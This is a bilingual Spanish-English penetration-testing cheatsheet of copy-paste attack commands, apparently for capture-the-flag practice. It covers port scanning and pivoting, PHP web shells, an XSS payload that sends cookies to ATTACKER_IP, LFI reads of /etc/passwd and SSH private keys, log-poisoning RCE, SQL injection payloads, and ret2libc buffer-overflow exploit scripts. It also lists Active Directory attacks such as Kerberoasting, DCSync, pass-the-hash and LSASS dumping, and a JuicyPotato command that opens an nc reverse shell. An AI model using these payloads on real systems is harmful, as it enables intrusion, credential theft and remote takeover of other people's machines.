# Cheatsheet
Cosas copypaste

# Red

### Port Scanning

#### TCP/SYN
```
nmap -sS -sCV -p- IP --min-rate 5000 -Pn -n --open -v -oN nmap.txt
```
#### UDP top 500 
```
nmap -sU --top-ports 500 --open -T5 -v -n IP
```
#### SC/TP 
```
nmap -sCV -p- -sS --min-rate 5000 --open -vvv -n -Pn IP -sY
```
#### Pivoting scan
```
proxychains nmap -sT -p- -sV -Pn -T5 -v -n --open IP
```
#### Vuln
```
nmap -sV -p PORTS --script vuln IP -oN nmap
```

### SNMP

MIB Tree
```
snmpwalk -c public -v1(snmp version) -t 10 IP
```
Windows Users
```
snmpwalk -c public -v1 IP 1.3.6.1.4.1.77.1.2.25
```
Windows Processes
```
snmpwalk -c public -v1 IP 1.3.6.1.2.1.25.4.2.1.2
```
Open TCP Ports
```
snmpwalk -c public -v1 IP 1.3.6.1.2.1.6.13.1.3
```
Installed Software
```
snmpwalk -c public -v1 IP 1.3.6.1.2.1.25.6.3.1.2
```

### Host Discovery (ARP y DNS Resolution)

#### Nmap
```
nmap -sn network/address
```
#### Python Script (ICMP scan)
```
wget https://raw.githubusercontent.com/CronoX1/Host-Discovery/main/Host-Discovery.py
```
### Port Forwarding

#### Socat

```
socat TCP-LISTEN:LISTENNING_PORT,fork sctp:REMOTE_IP:REMOTE_PORT
```
#### Chisel

Atacante
```
./chisel server --reverse -p ATACKER_PORT
```
Víctima
```
./chisel client ATTACKER_IP:ATTACKER_PORT R:VICTIM_IP:VICTIM_PORT
```
#### SSH 

Local Port Forwarding
```
ssh -N -L ATTACKER_IP:ATTACKER_PORT:VICTIM_IP:VICTIM_PORT victimuser@ip
```
Remort Port Forwarding (Firewall)
```
ssh -N -R ATTACKER_IP:ATTACKER_PORT(listener):VICTIM_IP:VICTIM_PORT attackeruser@attackerip
```
### Pivoting

#### SSH

Dynamic Port Forwarding
```
ssh -N -D ATTACKER_IP:ATTACKER_PORT victimuser@ip
```
(Edit Proxychains.conf)
```
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4 127.0.0.1 ATTACKER_PORT
```

#### Chisel

Attacker machine
```
./chisel server --reverse -p PORT --socks5
```
Victime Machine
```
./chisel client ATTACKER_IP:ATTACKER_PORT R:127.0.0.1:socks
```
(Edit Proxychains.conf)
```
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 ATTACKER_PORT
```

### DNS

#### dnsenum
```
dnsenum domain
```
#### Domain Zone Transfer (AXFR)
```
dig @IP dominio axfr
```

# Web

## Enumeracion
### Directory Listing & subdomain discovering

#### Wfuzz

Subdomaing Discovering

```
wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.dominio.ext" url
```
Directory Listing

```
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://Domain-or-IP/FUZZ
```
#### Gobuster

Subdomaing Discovering

```
gobuster vhost -u url -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```
Directory Listing

```
gobuster dir -e -u http://Domain-or-IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
## Reverse Shell

RCE PHP
```
<?php system($_GET[cmd]);?>
```

RCE .aspx
```
https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx
```

Shell PHP
```
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
```
## XSS

```
<script>document.location="http://ATTACKER_IP/value_cookie="+document.cookie</script>
```

## LFI

### PHP Wrappers 

Base64
```
php://filter/convert.base64-encode/resource=nombre_archivo.php
```
### Archivos interesantes que leer

Usuarios del sistema
```
curl -s 'http://domino/archivo.php?file=/etc/passwd'
```
Grupos a los que pertenecen los usuarios
```
curl -s 'http://domino/archivo.php?file=/etc/group'
```
SSH private key
```
curl -s 'http://domino/archivo.php?file=/home/usuario/.ssh/id_rsa'
```
Servicios y programas activos/corriendo en el sistema
```
curl -s 'http://domino/archivo.php?file=/proc/sched_debug'
```
IP de la máquina
```
curl -s 'http://domino/archivo.php?file=/proc/net/fib_trie'
```
Puertos abiertos internos
```
for port in $(curl -s 'http://dominio/archivo.php?post=/proc/net/tcp' | awk '{print $2}' | grep -v "local_address" | awk '{print $2}' FS=":" | sort -u); do echo "Puerto --> $(echo "ibase=16; $port" | bc)"; done
```

### LFI to RCE 

#### Apache Logs Poisoning

Añadir en el User Agent
```
<?php system($_GET['cmd']); ?>
```
RCE
```
/var/log/httpd-access.log&cmd=id
```
```
/var/log/apache2/access.log&cmd=id
```
#### SSH Log Poisoning

Hacer petición al SSH
```
ssh '<?php system($_GET['cmd']); ?>'@IP
```
RCE
```
/var/log/auth.log&cmd=id
```

## SQL Injection

Database (BBDD, DB) enumeration (sustituir el numero correspondiente del último valor por 'database()' para saber el nombre de la BBDD)
```
UNION SELECT 1,2,...
```
### Payloads

```
'
```
```
)'
```
```
''
```
```
`
```
```
')
```
```
'')
```
```
`)
```
```
'))
```
```
`)
```
```
'-SLEEP(30); #
```

### In-band or Error Based

Tables enumeration
```
UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'nombre_BBDD'; - --
```
Columns of table enumeration
```
UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'nombre_tabla'; - --
```
Table dumping
```
UNION SELECT 1,2,group_concat(columna1,':',columna2 SEPARATOR '<br>') FROM nombre_tabla; - --
```
### Blind SQLI

Login Bypass

```
' or 1=1 - --
```
```
' or '1'='1'#
```
```
' or '1'=1 --+
```
```
user' or 1=1;#
```
```
user' or 1=1 LIMIT 1;#
```
```
user' or 1=1 LIMIT 0,1;#
```
### Boolean Based (poner siempre por defecto 'false')

Database enumeration brute force attack(sin sustituir ninguno de los numeros)
```
UNION SELECT 1,2,3 where database() like '%'; - --
```
Tables enumeration
```
UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'BBDD' and table_name like '%';- --
```
Columns enumeration
```
UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='BBDD' and TABLE_NAME='nombre_tabla' and COLUMN_NAME like '%'; - --
```
Columns enumeration una vez encontrada una columna
```
UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='BBDD' and TABLE_NAME='nombre_tabla' and COLUMN_NAME like '%' and COLUMN_NAME !='nombre_tabla_encontrada'; - --
```
Table dumping
```
UNION SELECT 1,2,3 from nombre_tabla where nombre_columna like '%' and nombre_columna like '%'; - --
```
### Time Based

Injección UNION BASED SQL
```
UNION SELECT SLEEP(5),2,...; - --
```
MSSQL
```
IF EXISTS (SELECT 1 FROM dbo.users WITH(NOLOCK) WHERE username like 'a%') WAITFOR DELAY '0:0:5'-- --
```

### PHP Web Shell
```
select "<?php system($_GET[cmd]);?>" into outfile '/var/www/html/cronoshell.php'
```

# Passwords attack

Custom password dictionary
```
hashcat --stdout  -r rules/best64.rule file
```
## Bruteforce
Services
```
hydra -L users.txt -P passwords.txt ssh://IP
```
Web
```
hydra -L users.txt -P passwords.txt domain.ext http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"
```

# Linux

## Comandos utiles

Buscar Archivos
```
find / -name nombre_archivo 2>/dev/null
```
Buscar archivos que tengan "x" palabra
```
grep -r -i "palabra_a_buscar" 2>/dev/null
```
## Listeners

Paquetes ICMP
```
tcpdump -i NETINTERFACE icmp -n
```
Shell nc
```
nc -lvnp PORT
```
Shell chetada
```
rlwrap nc -lvnp PORT
```

## PostExplotacion

Crear un HTTP server

```
python3 -m http.server PORT
```
Permisos SUID
```
find / -user root -perm /4000 2>/dev/null
```
Ejecutar como root
```
sudo -l
```

Tareas programadas

```
cat /etc/crontab
```



### PEASS-ng
```
https://github.com/carlospolop/PEASS-ng
```

### Mejorar Shell

```
script /dev/null -c bash
```
```
stty raw -echo ;fg
```
```
reset xterm
```
```
export TERM=xterm
```
```
export SHELL=bash
```

# Bash

## Eliminar palabras
```
tr -d 'palabra'
```
## Filtrar por una palabra
```
grep "palabra"
```
## Seleccionar la palabra a filtrar en la linea
```
awk '{print $lugar}'
```
## Filtrar una palabra que esté entre caracteres
```
grep -oP 'caracter.*?caracter'
```
## Eliminar palabras repetidas
```
uniq
```

# Buffer Overflow

## Linux [s4vitar - HTB October](https://youtu.be/3QZfUBVr-AA?t=4150)

### Taking the binary to the attacker machine

On the victim machine
```
base64 -w 0 /usr/local/bin/ovrflw; echo
```
On the attacker machine
```
cat ovrflw | base64 -d | sponge ovrflw
```
```
chmod +x ovrflw
```
### Debugging the binary (gdb)
```
gdb ./ovrflw
```
Get the gef dependencies
```
pi import urllib.request as u, tempfile as t; g=t.NamedTemporaryFile(suffix='-gef.py'); open(g.name, 'wb+').write(u.urlopen('https://tinyurl.com/gef-main').read()); gdb.execute('source %s' % g.name)
```

Run the binary
```
r 
```
Watching the functions
```
info function
```
Break point on "main" function
```
b *main
```
Watching the registers
```
i r
```
Check protections (NX is DEP = Data Execution Prevention)
```
checksec
```
Create a pattern
```
pattern create
```
Run the binary with the patern

Find the offset
```
pattern offset $eip
```
Run the binary with the offset breakpoint to confirm
```
r $(python -c 'print("A"*offser_breakpoint + "B"*4)')
```
### NX disable

Set a breakpoint on the main function

Check the system_addr_off
```
p system
```
Check the exit_addr_off
```
p exit
```
Check the bin_sh_addr_off
```
find "/bin/sh"
```

```
#!/usr/bin/python3

from struct import pack
from subprocess import call

full_path_to_binary =

offset = 

junk = b"A"*offset

# All varibles must have the same number of characters

base_libc_addr = 

system_addr_off = 

exit_addr_off = 

bin_sh_addr_off = 

system_addr = pack("<L", base_libc_addr + system_addr_off)
exit_addr = pack("<L", base_libc_addr + exit_addr_off)
bin_sh_addr = pack("<L", base_libc_addr + bin_sh_addr_off)


payload = junk + system_addr + exit_addr + bin_sh_addr

ret = call([full_path_to_binary, payload])
```

### NX enable

Check the system architecture 
```
uname -r 
```
Check if ASLR is enable ("1" for disable, "2" for enable)
```
cat /proc/sys/kernel/randomize_va_space
```
Check Dynamic Dependencies
```
ldd /path/to/binary
```
#### Ret2libc

eip --> system_addr + exit_addr + bin_sh_addr

Check the system_addr_off and exit_addr_off
```
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E " system| exit"
```
Check the bin_sh_addr_off
```
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
```
#### Exploit.py
```
#!/usr/bin/python3

from struct import pack
from subprocess import call

full_path_to_binary =

offset = 

junk = b"A"*offset

# ret2libc -> system_addr + exit_addr + bin_sh_addr

# All varibles must have the same number of characters

base_libc_addr = 

system_addr_off = 

exit_addr_off = 

bin_sh_addr_off = 

system_addr = pack("<L", base_libc_addr + system_addr_off)
exit_addr = pack("<L", base_libc_addr + exit_addr_off)
bin_sh_addr = pack("<L", base_libc_addr + bin_sh_addr_off)


payload = junk + system_addr + exit_addr + bin_sh_addr

while True:
    ret = call([full_path_to_binary, payload])
```

# Windows

## Comandos útiles

Descargar binarios
```
powershell IEX(New-Object Net.WebClient).downloadString('http://IP:PORT/binario.binario')
```
```
curl "http://IP/binario" -o binario
```

Buscar archivo
```
Get-Childitem C:\ -Include nombre_archivo -File -Recurse -erroraction 'silentlycontinue'
```
```
dir /r /s filename
```

## Hashes

Malicious SCF File
```
[Shell]
Command=2
IconFile=\\IP\smbfolder\CronoX.ico
[Taskbar]
Command=ToggleDesktop
```
```
impacket-smbserver smbFolder $(pwd) -smb2support
```
## SMB

User Enumeration
```
enum4linux IP
```
Permission enumeration
```
smbmap -H IP -u usuario -p password
```
Listing with Null Session
```
smbclient -L IP -N
```
Enumeracion de directorios con usuario
```
smbclient \\\\IP\\directorio -U 'username%password'
```
Protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
```
smbclient -L IP --option="client min protocol=NT1"
```
SMB Enum Shares
```
nmap -p445 --script smb-enum-shares IP
```
## MSSQL (Microsoft SQL Server)

Conectarse la BBDD con SQSH
```
sqsh -S <IP> -U <Username> -P <Password> -D <Database>
```
Comandos útiles 

[Hacktricks MSSQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)

## Active Directory (AD)

### Kerberos user enumeration

```
kerbrute userenum -d domain.local users.txt --dc IP
```
### ASREPRoasting

```
GetNPUsers.py domain.local/user -usersfile users.txt
```
### Kerberoasting

```
GetUserSPNs.py DC-IP\user:password
```
### DRSUAPI (DCSync/NTDS Dumping)

```
secretsdump.py domain.local/USER:PASSWORD@IP
```
```
crackmapexec smb network/address -u users -p passwords --ntds vss
```
### Pass the hash

```
evil-winrm -i IP -u user -H 'NTHash'
```
```
psexec.py domain.local/user@ip -hashes 'LMHASH:NTHASH'
```
```
wmiexec.py user@IP -hashes 'LMHASH:NTHASH'
```
### SMB Relay

```
responder -I  NETINTERFACE -dw
```
### NTLM Relay [responder.conf con smb y http en "off" (SAM dumping without 'c' flag)]

```
ntlmrelayx.py -tf targets.txt -smb2support -c "command"
```
### Domain Host Discovery

```
crackmapexec smb network/address
```
### User & Password Spraying

```
crackmapexec smb network/address -u users -p passwords
```
### Userenum with RPC (-N para Null Session)

```
rpcclient -U 'domain.local\user%password' IP -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v '0x'
```
### Descripcion usuarios with RPC

```
for rid in $(rpcclient -U 'dominio.local\user%password' IP -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v '0x'| tr -d '[]'); do echo -e "\n[+] Para el RID $rid:\n";  rpcclient -U 'dominio.local\user%password' IP -c "queryuser $rid" | grep -E -i "user name|description" ;done
```
### Usuarios del AD (ADWS)
```
Get-ADUser -Filter * | select name
```
### ReadGMSAPassword
```
python3 gMSADumper.py -u 'user' -p 'password' -l IP -d domain.local 
```

### Dumpear LSASS
Obtener el ID del proceso
```
(Get-Process lsass).id
```
Dumpear el LSASS
```
rundll32 C:\Windows\System32\comsvcs.dll, MiniDump ID_del_Proceso lsass.dmp full
```
Levantar un servidor SMB
```
impacket-smbserver smbFolder $(pwd) -smb2support
```
Copiar el lsass en el servidor SMB
```
cp lsass.dump \\IP_ATACANTE\smbFolder\lsass.dmp
```
Parsear el lsass.dmp
```
pypykatz lsa minidump lsass.dmp
```
### ldapdomaindump

```
service apache2 start
```
```
ldapdomaindump -u 'domain.local\user' -p 'password' targetIP
```
## Privilege Escalation

### SeImpersonatePrivilege (JuicyPotato.exe)
```
.\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\PATH\TO\nc.exe -e C:\Windows\System32\cmd.exe ATTACKER_IP ATTACKER_PORT"
```
### Windows Exploit Sugester [Github](https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py)

Download Database
```
python2 windows-exploit-suggester.py -u
```
Search for exploits ([E] means Privilege Escalation)
```
python2 windows-exploit-suggester.py -d database.xls -i systeminfo.txt
```
